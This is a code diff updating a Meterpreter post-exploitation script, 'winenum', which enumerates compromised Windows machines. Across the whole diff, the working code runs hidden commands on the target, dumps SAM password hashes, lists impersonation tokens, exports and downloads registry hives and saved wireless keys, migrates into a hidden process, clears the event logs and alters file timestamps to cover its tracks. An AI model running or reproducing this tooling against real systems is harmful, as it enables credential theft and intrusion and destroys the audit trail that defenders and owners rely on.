@@ -3,14 +3,14 @@
 #Meterpreter script for basic enumeration of Windows 2000, Windows 2003, Windows Vista
 # and Windows XP targets using native windows commands.
 #Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-#Verion: 0.3.4
+#Verion: 0.3.5
 #Note: Compleatly re-writen to make it modular and better error handling.
 #      Working on adding more Virtual Machine Checks and looking at improving
 #      the code but retain the independance of each module so it is easier for
 #      the code to be re-used.
 #Contributor: natron (natron 0x40 invisibledenizen 0x2E com) (Process Migration Functions)
 ################## Variable Declarations ##################
-
+@client = client
 opts = Rex::Parser::Arguments.new(
 	"-h" => [ false, "Help menu." ],
 	"-m" => [ false, "Migrate the Meterpreter Session from it current process to a new cmd.exe before doing anything" ],
@@ -43,20 +43,19 @@ opts.parse(args) { |opt, idx, val|
 
 #-------------------------------------------------------------------------------
 
-session = client
-host,port = session.tunnel_peer.split(':')
-
+host,port = @client.tunnel_peer.split(':')
+info = @client.sys.config.sysinfo
 # Create Filename info to be appended to downloaded files
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+"-"+sprintf("%.5d",rand(100000))
 
 # Create a directory for the logs
-logs = ::File.join(Msf::Config.log_directory, 'winenum', host + filenameinfo )
+logs = ::File.join(Msf::Config.log_directory, 'winenum', info['Computer'] + filenameinfo )
 
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
 
 #logfile name
-dest = logs + "/" + host + filenameinfo + ".txt"
+dest = logs + "/" + info['Computer'] + filenameinfo + ".txt"
 
 # Commands that will be ran on the Target
 commands = [
@@ -150,20 +149,74 @@ nowin2kexe = [
 	'wbem\\wmic.exe',
 ]
 ################## Function Declarations ##################
+#Returns the data of a given registry key and value
+def reg_getvaldata(key,valname)
+	value = nil
+	begin
+		root_key, base_key = @client.sys.registry.splitkey(key)
+		open_key = @client.sys.registry.open_key(root_key, base_key, KEY_READ)
+		v = open_key.query_value(valname)
+		value = v.data
+		open_key.close
+	end
+	return value
+end
+#Enumerates the subkeys of a given registry key returns array of subkeys
+def reg_enumkeys(key)
+	subkeys = []
+	begin
+		root_key, base_key = @client.sys.registry.splitkey(key)
+		open_key = @client.sys.registry.open_key(root_key, base_key, KEY_READ)
+		keys = open_key.enum_key
+		keys.each { |subkey|
+			subkeys << subkey
+		}
+		open_key.close
+	end
+	return subkeys
+end
+def findprogs()
+	print_status("Extracting software list from registry")
+	proglist = ""
+	threadnum = 0
+	proglist << "*****************************************\n"
+	proglist << "Program List\n"
+	proglist << "*****************************************\n"
+	a =[]
+	keyx86 = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall'
+	reg_enumkeys(keyx86).each do |k|
+		if threadnum < 10
+			a.push(::Thread.new {
+					begin
+						dispnm = reg_getvaldata("#{keyx86}\\#{k}","DisplayName")
+						dispversion = reg_getvaldata("#{keyx86}\\#{k}","DisplayVersion")
+					rescue
+					end
+					proglist << "#{dispnm}\t#{dispversion}\n" if dispnm =~ /[a-z]/
 
+				})
+			threadnum += 1
+		else
+			sleep(0.05) and a.delete_if {|x| not x.alive?} while not a.empty?
+			threadnum = 0
+		end
+
+	end
+	return proglist
+end
 # Function to check if Target Machine a VM
 # Note: will add soon Hyper-v and Citrix Xen check.
-def chkvm(session)
+def chkvm()
 	check = nil
 	vmout = ''
-	info = session.sys.config.sysinfo
+	info = @client.sys.config.sysinfo
 	print_status "Checking if #{info['Computer']} is a Virtual Machine ........"
 
 	# Check for Target Machines if running in VM, only fo VMware Workstation/Fusion
 	begin
 		key = 'HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS'
-		root_key, base_key = session.sys.registry.splitkey(key)
-		open_key = session.sys.registry.open_key(root_key,base_key,KEY_READ)
+		root_key, base_key = @client.sys.registry.splitkey(key)
+		open_key = @client.sys.registry.open_key(root_key,base_key,KEY_READ)
 		v = open_key.query_value('SystemManufacturer')
 		sysmnfg =  v.data.downcase
 		if sysmnfg =~ /vmware/
@@ -183,8 +236,8 @@ def chkvm(session)
 			#Registry path using the HD and CD rom entries in the registry in case propirtary tools are
 			#not installed.
 			key2 = "HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0"
-			root_key2, base_key2 = session.sys.registry.splitkey(key2)
-			open_key2 = session.sys.registry.open_key(root_key2,base_key2,KEY_READ)
+			root_key2, base_key2 = @client.sys.registry.splitkey(key2)
+			open_key2 = @client.sys.registry.open_key(root_key2,base_key2,KEY_READ)
 			v2 = open_key2.query_value('Identifier')
 
 			if v2.data.downcase =~ /vmware/
@@ -207,92 +260,131 @@ def chkvm(session)
 	vmout
 end
 #-------------------------------------------------------------------------------
-
 # Function for running a list a commands stored in a array, returs string
-def list_exec(session,cmdlst)
+def list_exec(cmdlst)
 	print_status("Running Command List ...")
 	tmpout = ""
 	cmdout = ""
 	r=''
-	session.response_timeout=120
+	i = 0
+	a =[]
+	@client.response_timeout=120
 	cmdlst.each do |cmd|
-		begin
-			print_status "\trunning command #{cmd}"
-			tmpout = ""
-			tmpout << "*****************************************\n"
-			tmpout << "      Output of #{cmd}\n"
-			tmpout << "*****************************************\n"
-			r = session.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
-			while(d = r.channel.read)
 
-				tmpout << d
-			end
-			cmdout << tmpout
-			r.channel.close
-			r.close
-		rescue ::Exception => e
-			print_status("Error Running Command #{cmd}: #{e.class} #{e}")
+		if i < 10
+			a.push(::Thread.new {
+
+					print_status "\trunning command #{cmd}"
+					tmpout = ""
+					tmpout << "*****************************************\n"
+					tmpout << "      Output of #{cmd}\n"
+					tmpout << "*****************************************\n"
+					r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
+					while(d = r.channel.read)
+
+						tmpout << d
+					end
+					filewrt(@report,tmpout)
+					tmpout = nil
+					r.channel.close
+					r.close
+
+				})
+			i += 1
+		else
+			sleep(0.01) and a.delete_if {|x| not x.alive?} while not a.empty?
+			i = 0
 		end
 	end
-	cmdout
+	a.delete_if {|x| not x.alive?} while not a.empty?
+
 end
 #-------------------------------------------------------------------------------
 # Function for running a list of WMIC commands stored in a array, returs string
-def wmicexec(session,wmiccmds= nil)
+def wmicexec(wmiccmds= nil)
 	print_status("Running WMIC Commands ....")
-	windr = ''
 	tmpout = ''
-	windrtmp = ""
-	session.response_timeout=120
+	i, a = 0, []
+	output_files = []
+	@client.response_timeout=120
+
 	begin
-		tmp = session.fs.file.expand_path("%TEMP%")
-		wmicfl = tmp + "\\wmictmp.txt"
+		tmp = @client.fs.file.expand_path("%TEMP%")
+
 		wmiccmds.each do |wmi|
-			print_status "\trunning command wmic #{wmi}"
-			r = session.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
-			sleep(1)
-			r = session.sys.process.execute("cmd.exe /c echo      Output of wmic #{wmi} >> #{wmicfl}",nil, {'Hidden' => 'true'})
-			sleep(1)
-			r = session.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
-			sleep(1)
-			r = session.sys.process.execute("cmd.exe /c wmic /append:#{wmicfl} #{wmi}", nil, {'Hidden' => true})
-			sleep(2)
-			#Making sure that wmic finnishes before executing next wmic command
-			prog2check = "wmic.exe"
-			found = 0
-			while found == 0
-				session.sys.process.get_processes().each do |x|
-					found =1
-					if prog2check == (x['name'].downcase)
-						sleep(0.5)
+			wmicfl = tmp + "\\#{sprintf("%.5d",rand(100000))}.txt"
+			output_files << "#{wmicfl}"
+			if i < 10
+				a.push(::Thread.new {
+						print_status "\trunning command wmic #{wmi}"
+						r = @client.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
+						sleep(1)
+						r = @client.sys.process.execute("cmd.exe /c echo      Output of wmic #{wmi} >> #{wmicfl}",nil, {'Hidden' => 'true'})
+						sleep(1)
+						r = @client.sys.process.execute("cmd.exe /c echo ***************************************** >> #{wmicfl}",nil, {'Hidden' => 'true'})
+						sleep(1)
+						r = @client.sys.process.execute("cmd.exe /c wmic /append:#{wmicfl} #{wmi}", nil, {'Hidden' => true})
+						sleep(2)
+
+						
+						#Making sure that wmic finnishes before executing next wmic command
+						prog2check = "wmic.exe"
 						found = 0
-					end
-				end
+						while found == 0
+							@client.sys.process.get_processes().each do |x|
+								found =1
+								if prog2check == (x['name'].downcase)
+									sleep(0.5)
+									found = 0
+								end
+							end
+						end
+						r.close
+					})
+				i += 1
+			else
+				sleep(0.01) and a.delete_if {|x| not x.alive?} while not a.empty?
+				i = 0
 			end
-			r.close
 		end
-		# Read the output file of the wmic commands
-		wmioutfile = session.fs.file.new(wmicfl, "rb")
-		until wmioutfile.eof?
-			tmpout << wmioutfile.read
-		end
-		wmioutfile.close
+		a.delete_if {|x| not x.alive?} while not a.empty?
+
 	rescue ::Exception => e
 		print_status("Error running WMIC commands: #{e.class} #{e}")
 	end
+
+	#print_status("Waiting for WMIC to finnish running all commands.......")
+	
+	print_status("\tReading all output of WMIC commands...")
+	output_files.each do |of|
+		begin
+			# Read the output file of the wmic commands
+			wmioutfile = @client.fs.file.new(of, "rb")
+			until wmioutfile.eof?
+				tmpout << wmioutfile.read
+			end
+			wmioutfile.close
+		rescue
+		end
+	end
 	# We delete the file with the wmic command output.
-	c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, {'Hidden' => true})
-	c.close
+	print_status("\tCleanning left over files...")
+	output_files.each do |of|
+		begin
+			@client.fs.file.rm(of)
+		rescue
+		end
+	end
 	tmpout
 end
 #-------------------------------------------------------------------------------
 #Function for getting the NTLM and LANMAN hashes out of a system
-def gethash(session)
+def gethash()
 	print_status("Dumping password hashes...")
 	begin
 		hash = ''
-		session.core.use("priv")
-		hashes = session.priv.sam_hashes
+		@client.core.use("priv")
+		hashes = @client.priv.sam_hashes
 		hash << "****************************\n"
 		hash << "  Dumped Password Hashes\n"
 		hash << "****************************\n\n"
@@ -310,17 +402,17 @@ def gethash(session)
 end
 #-------------------------------------------------------------------------------
 #Function that uses the incognito fetures to list tokens on the system that can be used
-def listtokens(session)
+def listtokens()
 	begin
 		print_status("Getting Tokens...")
 		dt = ''
-		session.core.use("incognito")
+		@client.core.use("incognito")
 		i = 0
 		dt << "****************************\n"
 		dt << "  List of Available Tokens\n"
 		dt << "****************************\n\n"
 		while i < 2
-			tokens = session.incognito.incognito_list_tokens(i)
+			tokens = @client.incognito.incognito_list_tokens(i)
 			if i == 0
 				tType = "User"
 			else
@@ -340,8 +432,8 @@ def listtokens(session)
 			tokens['impersonation'].each_line{ |string|
 				dt << string + "\n"
 			}
-	   		i += 1
-	   		break if i == 2
+			i += 1
+			break if i == 2
 		end
 		print_status("All tokens have been processed")
 	rescue ::Exception => e
@@ -352,7 +444,7 @@ def listtokens(session)
 end
 #-------------------------------------------------------------------------------
 # Function for clearing all eventlogs
-def clrevtlgs(session)
+def clrevtlgs()
 	evtlogs = [
 		'security',
 		'system',
@@ -365,7 +457,7 @@ def clrevtlgs(session)
 	begin
 		evtlogs.each do |evl|
 			print_status("\tClearing the #{evl} Event Log")
-			log = session.sys.eventlog.open(evl)
+			log = @client.sys.eventlog.open(evl)
 			log.clear
 		end
 		print_status("Alll Event Logs have been cleared")
@@ -377,18 +469,18 @@ end
 #-------------------------------------------------------------------------------
 # Function for Changing Access Time, Modified Time and Created Time of Files Supplied in an Array
 # The files have to be in %WinDir%\System32 folder.
-def chmace(session,cmds)
+def chmace(cmds)
 	windir = ''
 	windrtmp = ""
 	print_status("Changing Access Time, Modified Time and Created Time of Files Used")
-	windir = session.fs.file.expand_path("%WinDir%")
+	windir = @client.fs.file.expand_path("%WinDir%")
 	cmds.each do |c|
 		begin
-			session.core.use("priv")
+			@client.core.use("priv")
 			filetostomp = windir + "\\system32\\"+ c
 			fl2clone = windir + "\\system32\\chkdsk.exe"
 			print_status("\tChanging file MACE attributes on #{filetostomp}")
-			session.priv.fs.set_file_mace_from_file(filetostomp, fl2clone)
+			@client.priv.fs.set_file_mace_from_file(filetostomp, fl2clone)
 
 		rescue ::Exception => e
 			print_status("Error changing MACE: #{e.class} #{e}")
@@ -397,25 +489,25 @@ def chmace(session,cmds)
 end
 #-------------------------------------------------------------------------------
 #Dumping and Downloading the Registry of the target machine
-def regdump(session,pathoflogs,filename)
-	host,port = session.tunnel_peer.split(':')
+def regdump(pathoflogs,filename)
+	host,port = @client.tunnel_peer.split(':')
 	#This variable will only contain garbage, it is to make sure that the channel is not closed while the reg is being dumped and compress
 	garbage = ''
 	windrtmp = ''
 	hives = %w{HKCU HKLM HKCC HKCR HKU}
-	windir = session.fs.file.expand_path("%WinDir%")
+	windir = @client.fs.file.expand_path("%WinDir%")
 	print_status('Dumping and Downloading the Registry')
 	hives.each_line do |hive|
 		begin
 			print_status("\tExporting #{hive}")
-			r = session.sys.process.execute("cmd.exe /c reg.exe export #{hive} #{windir}\\Temp\\#{hive}#{filename}.reg", nil, {'Hidden' => 'true','Channelized' => true})
+			r = @client.sys.process.execute("cmd.exe /c reg.exe export #{hive} #{windir}\\Temp\\#{hive}#{filename}.reg", nil, {'Hidden' => 'true','Channelized' => true})
 			while(d = r.channel.read)
 				garbage << d
 			end
 			r.channel.close
 			r.close
 			print_status("\tCompressing #{hive} into cab file for faster download")
-			r = session.sys.process.execute("cmd.exe /c makecab #{windir}\\Temp\\#{hive}#{filename}.reg #{windir}\\Temp\\#{hive}#{filename}.cab", nil, {'Hidden' => 'true','Channelized' => true})
+			r = @client.sys.process.execute("cmd.exe /c makecab #{windir}\\Temp\\#{hive}#{filename}.reg #{windir}\\Temp\\#{hive}#{filename}.cab", nil, {'Hidden' => 'true','Channelized' => true})
 			while(d = r.channel.read)
 				garbage << d
 			end
@@ -429,7 +521,7 @@ def regdump(session,pathoflogs,filename)
 	hives.each_line do |hive|
 		begin
 			print_status("\tDownloading #{hive}#{filename}.cab to -> #{pathoflogs}/#{host}-#{hive}#{filename}.cab")
-			session.fs.file.download_file("#{pathoflogs}/#{host}-#{hive}#{filename}.cab", "#{windir}\\Temp\\#{hive}#{filename}.cab")
+			@client.fs.file.download_file("#{pathoflogs}/#{host}-#{hive}#{filename}.cab", "#{windir}\\Temp\\#{hive}#{filename}.cab")
 			sleep(5)
 		rescue ::Exception => e
 			print_status("Error Downloading Registry Hives #{e.class} #{e}")
@@ -437,35 +529,19 @@ def regdump(session,pathoflogs,filename)
 	end
 	#Deleting left over files
 	print_status("\tDeleting left over files")
-	session.sys.process.execute("cmd.exe /c del #{windir}\\Temp\\HK*", nil, {'Hidden' => 'true'})
+	@client.sys.process.execute("cmd.exe /c del #{windir}\\Temp\\HK*", nil, {'Hidden' => 'true'})
 
 end
-#-------------------------------------------------------------------------------
-# Function for extracting program list from registry
-def findprogs(session)
-	print_status("Extracting software list from registry")
-	proglist = ""
-	session.sys.registry.create_key(HKEY_CURRENT_USER, 'Software').each_key() do |company|
-		proglist << "#{company}"
-	       
-	        session.sys.registry.create_key(HKEY_CURRENT_USER, "Software\\#{company}").each_key() do |software|
-			proglist <<  "\t#{software}"
-	        end
-	end
-	print_status("Finnished Extraction of software list from registry")
-	proglist
-end
-
 #-------------------------------------------------------------------------------
 # Function that will call 2 other Functions to cover all tracks
-def covertracks(session,cmdstomp)
-	clrevtlgs(session)
-	info = session.sys.config.sysinfo
+def covertracks(cmdstomp)
+	clrevtlgs()
+	info = @client.sys.config.sysinfo
 	trgtos = info['OS']
 	if trgtos =~ /(Windows 2000)/
-		chmace(session,cmdstomp - nonwin2kcmd)
+		chmace(cmdstomp - nonwin2kcmd)
 	else
-		chmace(session,cmdstomp)
+		chmace(cmdstomp)
 	end
 end
 #-------------------------------------------------------------------------------
@@ -481,25 +557,25 @@ end
 
 # Function for dumping Registry keys that contain wireless configuration settings for Vista and XP 
 # This keys can later be imported into a Windows client for conection or key extraction.
-def dumpwlankeys(session,pathoflogs,filename)
-	host,port = session.tunnel_peer.split(':')
+def dumpwlankeys(pathoflogs,filename)
+	host,port = @client.tunnel_peer.split(':')
 	#This variable will only contain garbage, it is to make sure that the channel is not closed while the reg is being dumped and compress
 	garbage = ''
 	windrtmp = ''
-	windir = session.fs.file.expand_path("%TEMP%")
+	windir = @client.fs.file.expand_path("%TEMP%")
 	print_status('Dumping and Downloading the Registry entries for Configured Wireless Networks')
 	xpwlan = "HKLM\\Software\\Microsoft\\WZCSVC\\Parameters\\Interfaces"
 	vswlan = "HKLM\\Software\\Microsoft\\Wlansvc"
-	info = session.sys.config.sysinfo
+	info = @client.sys.config.sysinfo
 	trgtos = info['OS']
 	if trgtos =~ /(Windows XP)/
 		key = xpwlan
 	elsif trgtos =~ /(Windows Vista)/
 		key = vswlan
 	end
-  	begin
+	begin
 		print_status("\tExporting #{key}")
-		r = session.sys.process.execute("reg export \"#{key}\" #{windir}\\wlan#{filename}.reg", nil, {'Hidden' => 'true','Channelized' => true})
+		r = @client.sys.process.execute("reg export \"#{key}\" #{windir}\\wlan#{filename}.reg", nil, {'Hidden' => 'true','Channelized' => true})
 		while(d = r.channel.read)
 			garbage << d
 		end
@@ -507,34 +583,34 @@ def dumpwlankeys(session,pathoflogs,filename)
 		r.channel.close
 		r.close
 		print_status("\tCompressing key into cab file for faster download")
-		r = session.sys.process.execute("cmd.exe /c makecab #{windir}\\wlan#{filename}.reg #{windir}\\wlan#{filename}.cab", nil, {'Hidden' => 'true','Channelized' => true})
+		r = @client.sys.process.execute("cmd.exe /c makecab #{windir}\\wlan#{filename}.reg #{windir}\\wlan#{filename}.cab", nil, {'Hidden' => 'true','Channelized' => true})
 		while(d = r.channel.read)
 			garbage << d
 		end
 		r.channel.close
 		r.close
-  	rescue ::Exception => e
+	rescue ::Exception => e
 		print_status("Error dumping Registry keys #{e.class} #{e}")
-  	end
+	end
 
 	#Downloading Compresed registry keys
 	
-	begin	
+	begin
 		print_status("\tDownloading wlan#{filename}.cab to -> #{pathoflogs}/wlan#{filename}.cab")
-		session.fs.file.download_file("#{pathoflogs}/wlan#{filename}.cab", "#{windir}\\wlan#{filename}.cab")
+		@client.fs.file.download_file("#{pathoflogs}/wlan#{filename}.cab", "#{windir}\\wlan#{filename}.cab")
 		sleep(5)
 	rescue ::Exception => e
-    		print_status("Error Downloading Registry keys #{e.class} #{e}")
-  	end
+		print_status("Error Downloading Registry keys #{e.class} #{e}")
+	end
 	#Deleting left over files
 	print_status("\tDeleting left over files")
-	#session.sys.process.execute("cmd.exe /c del #{windir}\\wlan*", nil, {'Hidden' => 'true'})
+	#@client.sys.process.execute("cmd.exe /c del #{windir}\\wlan*", nil, {'Hidden' => 'true'})
 
 end
 # Functions Provided by natron (natron 0x40 invisibledenizen 0x2E com)
 # for Process Migration
 #---------------------------------------------------------------------------------------------------------
-def launchProc(session,target)
+def launchProc(target)
 	print_status("Launching hidden #{target}...")
 
 	# Set the vars; these can of course be modified if need be
@@ -545,7 +621,7 @@ def launchProc(session,target)
 	use_thread_token = false
 
 	# Launch new process
-	newproc = session.sys.process.execute(cmd_exec, cmd_args,
+	newproc = @client.sys.process.execute(cmd_exec, cmd_args,
 		'Channelized' => channelized,
 		'Hidden'      => hidden,
 		'InMemory'    => nil,
@@ -556,21 +632,21 @@ def launchProc(session,target)
 	return newproc
 end
 #-------------------------------------------------------------------------------
-def migrateToProc(session,newproc)
+def migrateToProc(newproc)
 	# Grab the current pid info
-	server = session.sys.process.open
+	server = @client.sys.process.open
 	print_status("Current process is #{server.name} (#{server.pid}).  Migrating to #{newproc.pid}.")
 
 	# Save the old process info so we can kill it after migration.
 	oldproc = server.pid
 
 	# Do the migration
-	session.core.migrate(newproc.pid.to_i)
+	@client.core.migrate(newproc.pid.to_i)
 
 	print_status("Migration completed successfully.")
 
 	# Grab new process info
-	server = session.sys.process.open
+	server = @client.sys.process.open
 
 	print_status("New server process: #{server.name} (#{server.pid})")
 
@@ -578,47 +654,47 @@ def migrateToProc(session,newproc)
 end
 
 #-------------------------------------------------------------------------------
-def killApp(session,procpid)
-	session.sys.process.kill(procpid)
+def killApp(procpid)
+	@client.sys.process.kill(procpid)
 	print_status("Old process #{procpid} killed.")
 end
 
 #---------------------------------------------------------------------------------------------------------
 # Function to execute process migration
-def migrate(session)
+def migrate()
 	target = 'cmd.exe'
-	newProcPid = launchProc(session,target)
-	oldProc = migrateToProc(session,newProcPid)
+	newProcPid = launchProc(target)
+	oldProc = migrateToProc(newProcPid)
 	#killApp(oldProc)
-  	#Dangerous depending on the service exploited
+	#Dangerous depending on the service exploited
 end
 #---------------------------------------------------------------------------------------------------------
 #Function for Checking for UAC
-def uaccheck(session)
-        uac = false
-        winversion = session.sys.config.sysinfo
-        if winversion['OS']=~ /Windows Vista/ or  winversion['OS']=~ /Windows 7/
-                if session.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
-                        begin
-                                print_status("Checking if UAC is enabled .....")
-                                key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
-                                if key.query_value('Identifier') == 1
-                                        print_status("UAC is Enabled")
-                                        uac = true
-                                end
-                                key.close
-                        rescue::Exception => e
-                                print_status("Error Checking UAC: #{e.class} #{e}")
-                        end
-                end
-        end
-        return uac
+def uaccheck()
+	uac = false
+	winversion = @client.sys.config.sysinfo
+	if winversion['OS']=~ /Windows Vista/ or  winversion['OS']=~ /Windows 7/
+		if @client.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
+			begin
+				print_status("Checking if UAC is enabled .....")
+				key = @client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
+				if key.query_value('Identifier') == 1
+					print_status("UAC is Enabled")
+					uac = true
+				end
+				key.close
+			rescue::Exception => e
+				print_status("Error Checking UAC: #{e.class} #{e}")
+			end
+		end
+	end
+	return uac
 end
 ################## MAIN ##################
 
 # Execute Functions selected
 if (mg != nil)
-	migrate(session)
+	migrate()
 end
 # Main part of script, it will run all function minus the ones
 # that will chance the MACE and Clear the Eventlog.
@@ -626,62 +702,62 @@ print_status("Running Windows Local Enumerion Meterpreter Script")
 print_status("New session on #{host}:#{port}...")
 
 # Header for File that will hold all the output of the commands
-info = session.sys.config.sysinfo
+info = @client.sys.config.sysinfo
 header =  "Date:       #{::Time.now.strftime("%Y-%m-%d.%H:%M:%S")}\n"
-header << "Running as: #{client.sys.config.getuid}\n"
+header << "Running as: #{@client.sys.config.getuid}\n"
 header << "Host:       #{info['Computer']}\n"
 header << "OS:         #{info['OS']}\n"
 header << "\n\n\n"
+@report = dest
 print_status("Saving report to #{dest}")
 filewrt(dest,header)
-filewrt(dest,chkvm(session))
+filewrt(dest,chkvm())
 trgtos = info['OS']
-uac = uaccheck(session)
+uac = uaccheck()
 # Run Commands according to OS some commands are not available on all versions of Windows
 if trgtos =~ /(Windows XP)/
-	filewrt(dest,list_exec(session,commands))
-	filewrt(dest,wmicexec(session,wmic))
-	filewrt(dest,findprogs(session))
-	dumpwlankeys(session,logs,filenameinfo)
-	filewrt(dest,gethash(session))
+	list_exec(commands)
+	filewrt(dest,wmicexec(wmic))
+	filewrt(dest,findprogs())
+	dumpwlankeys(logs,filenameinfo)
+	filewrt(dest,gethash())
 elsif trgtos =~ /(Windows .NET)/
-	filewrt(dest,list_exec(session,commands))
-	filewrt(dest,wmicexec(session,wmic))
-	filewrt(dest,findprogs(session))
-	filewrt(dest,gethash(session))
+	list_exec(commands)
+	filewrt(dest,wmicexec(wmic))
+	filewrt(dest,findprogs())
+	filewrt(dest,gethash())
 elsif trgtos =~ /(Windows 2008)/
-	filewrt(dest,list_exec(session,commands + win2k8cmd))
-	#filewrt(dest,wmicexec(session,wmic))
-	#filewrt(dest,findprogs(session))
+	list_exec(commands + win2k8cmd)
+	filewrt(dest,wmicexec(wmic))
+	filewrt(dest,findprogs())
 	if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
 		print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows 2008 if not System.")
 	else
-		filewrt(dest,gethash(session))
+		filewrt(dest,gethash())
 	end
 elsif trgtos =~ /(Windows Vista)/ or trgtos =~ /(Windows 7)/
-	filewrt(dest,list_exec(session,commands + vstwlancmd))
-	filewrt(dest,wmicexec(session,wmic))
-	filewrt(dest,findprogs(session))
+	filewrt(dest,list_exec(commands + vstwlancmd))
+	filewrt(dest,wmicexec(wmic))
+	filewrt(dest,findprogs())
 	if not uac
-		dumpwlankeys(session,logs,filenameinfo) 
+		dumpwlankeys(logs,filenameinfo)
 	else
 		print_status("UAC is enabled, Wireless key Registry could not be dumped under current privileges")
 	end
 	if (client.sys.config.getuid != "NT AUTHORITY\\SYSTEM")
 		print_line("[-] Not currently running as SYSTEM, not able to dump hashes in Windows Vista or Windows 7 if not System.")
 	else
-		filewrt(dest,gethash(session))
+		filewrt(dest,gethash())
 	end
 elsif trgtos =~ /(Windows 2000)/
-	filewrt(dest,list_exec(session,commands - nonwin2kcmd))
-	filewrt(dest,gethash(session))
+	filewrt(dest,list_exec(commands - nonwin2kcmd))
+	filewrt(dest,gethash())
 end
 
-#filewrt(dest,gethash(session))
-filewrt(dest,listtokens(session))
+filewrt(dest,listtokens())
 if (rd != nil)
 	if not uac
-		regdump(session,logs,filenameinfo) 
+		regdump(logs,filenameinfo)
 		filewrt(dest,"Registry was dumped and downloaded")
 	else
 		print_status("UAC is enabled, Registry Keys could not be dumped under current privileges")
@@ -690,10 +766,10 @@ end
 if (cm != nil)
 	filewrt(dest,"EventLogs where Cleared")
 	if trgtos =~ /(Windows 2000)/
-		covertracks(session,cmdstomp - nowin2kexe)
+		covertracks(cmdstomp - nowin2kexe)
 	else
 		if not uac
-			covertracks(session,cmdstomp)
+			covertracks(cmdstomp)
 		else
 			print_status("UAC is enabled, Logs could not be cleared under current privileges")
 		end
